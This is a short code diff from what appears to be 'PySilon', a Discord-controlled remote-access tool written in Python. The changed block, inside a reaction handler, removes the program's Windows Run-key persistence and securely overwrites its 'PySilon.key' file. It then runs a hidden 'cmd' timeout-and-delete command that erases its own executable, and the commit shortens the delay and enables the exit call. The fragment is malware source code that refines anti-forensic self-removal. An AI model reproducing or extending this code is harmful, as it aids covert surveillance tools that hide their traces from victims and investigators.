@@ -237,9 +237,9 @@ async def on_reaction_add(reaction, user):
                         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                         winreg.DeleteValue(registry_key, software_directory_name)
                         secure_delete_file('PySilon.key', 10)
-                        cmd = 'start cmd /c "TIMEOUT /T 3&del "' + sys.argv[0] + '"'
+                        cmd = 'start cmd /c "TIMEOUT /T 2&del "' + sys.argv[0] + '"'
                         os.system(cmd)
-                        #sys.exit(0)
+                        sys.exit(0)
 
         except Exception as err: print(err)
 
